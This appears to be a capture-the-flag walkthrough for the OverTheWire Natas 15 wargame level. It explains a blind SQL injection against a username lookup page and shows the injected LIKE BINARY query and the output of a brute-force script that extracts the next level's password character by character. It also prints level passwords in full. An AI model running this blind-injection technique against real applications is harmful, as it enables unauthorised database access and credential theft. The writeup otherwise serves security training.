# Natas15

## Level Description
- **Username**: natas15
- **Password**: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
- **URL**: http://natas15.natas.labs.overthewire.org

## Method of Solving
![image-1](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas15/image-1.png)

Here is the PHP code for this challenge:

![image-2](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas15/image-2.png)

This one looks tricky because the only answers we'll get from this page are:
- This user doesn't exist.
- This user exists.

However, there is an SQL injection in the `username` field, but it's a blind one. We only get true/false answers. We just need to find a way to forge a query that will answer to questions like "Does the password for natas16 starts with 'a' ?" and get the results.

Here is solution:
```bash
SELECT * from users where username="natas16" and password like binary "x%"
```
We just check the `natas16` username as it exists in the database and add some statements by passing a double-quote after the username.

The statements `like binary "x%"` means that we want to check if the password start with `x` and we make that query case sensitive by using the binary statement.

If it does start with `x`, we'll get a "This user exists" in the page, if it doesn't we'll get a "This user doesn't exist.

Use the script `natas15_brute_force.py` to find the password of `natas16`. 
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/overthewire/natas/natas15]
└─$ python3 natas15_brute_force.py 
[*] Starting password extraction...
[+] Found character 1: h -> Current: h
[+] Found character 2: P -> Current: hP
[+] Found character 3: k -> Current: hPk
[+] Found character 4: j -> Current: hPkj
[+] Found character 5: K -> Current: hPkjK
[+] Found character 6: Y -> Current: hPkjKY
[+] Found character 7: v -> Current: hPkjKYv
[+] Found character 8: i -> Current: hPkjKYvi
[+] Found character 9: L -> Current: hPkjKYviL
[+] Found character 10: Q -> Current: hPkjKYviLQ
[+] Found character 11: c -> Current: hPkjKYviLQc
[+] Found character 12: t -> Current: hPkjKYviLQct
[+] Found character 13: E -> Current: hPkjKYviLQctE
[+] Found character 14: W -> Current: hPkjKYviLQctEW
[+] Found character 15: 3 -> Current: hPkjKYviLQctEW3
[+] Found character 16: 3 -> Current: hPkjKYviLQctEW33
[+] Found character 17: Q -> Current: hPkjKYviLQctEW33Q
[+] Found character 18: m -> Current: hPkjKYviLQctEW33Qm
[+] Found character 19: u -> Current: hPkjKYviLQctEW33Qmu
[+] Found character 20: X -> Current: hPkjKYviLQctEW33QmuX
[+] Found character 21: L -> Current: hPkjKYviLQctEW33QmuXL
[+] Found character 22: 6 -> Current: hPkjKYviLQctEW33QmuXL6
[+] Found character 23: e -> Current: hPkjKYviLQctEW33QmuXL6e
[+] Found character 24: D -> Current: hPkjKYviLQctEW33QmuXL6eD
[+] Found character 25: V -> Current: hPkjKYviLQctEW33QmuXL6eDV
[+] Found character 26: f -> Current: hPkjKYviLQctEW33QmuXL6eDVf
[+] Found character 27: M -> Current: hPkjKYviLQctEW33QmuXL6eDVfM
[+] Found character 28: W -> Current: hPkjKYviLQctEW33QmuXL6eDVfMW
[+] Found character 29: 4 -> Current: hPkjKYviLQctEW33QmuXL6eDVfMW4
[+] Found character 30: s -> Current: hPkjKYviLQctEW33QmuXL6eDVfMW4s
[+] Found character 31: G -> Current: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
[+] Found character 32: o -> Current: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
[!] Complete password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

***You are welcome!***
